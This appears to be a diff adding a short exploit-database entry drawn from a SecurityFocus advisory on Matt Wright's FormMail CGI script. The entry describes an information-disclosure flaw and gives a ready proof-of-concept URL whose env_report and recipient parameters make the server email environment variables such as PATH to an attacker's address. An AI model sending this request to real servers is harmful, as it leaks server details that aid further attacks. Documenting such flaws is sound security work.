@@ -1,0 +1,6 @@
+source: http://www.securityfocus.com/bid/1187/info
+
+An unauthorized remote user is capable of obtaining CGI environmental variable information from a web server running Matt Wright FormMail by requesting a specially formed URL that specifies the email address to send the details to. This is accomplished by specifying a particular CGI environmental variable such as PATH, DOCUMENT_ROOT, SERVER_PORT in the specially formed URL which will email the results to the address given. The information obtained could possibly be used to assist in a future attack.
+
+http:/target/cgibin/formmail.cgi?env_report=PATH&recipient=<email address>&required=&firstname=&lastname=&email=&message=&Submit=<message>
+This URL request assumes that the formmail.cgi script is located in the cgibin directory.
